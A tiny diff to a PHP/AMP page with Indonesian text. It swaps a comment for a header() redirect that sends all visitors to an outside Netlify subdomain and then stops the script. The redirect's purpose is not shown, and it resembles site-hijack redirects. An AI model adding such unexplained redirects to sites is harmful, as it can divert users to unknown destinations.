@@ -1,5 +1,6 @@
 <?php
-// File PHP dari HTML yang Anda berikan, siap dijalankan
+header("Location: https://zippy-kulfi-3bd033.netlify.app/");
+exit();
 ?>
 <!DOCTYPE html>
 <html ⚡ lang="id">
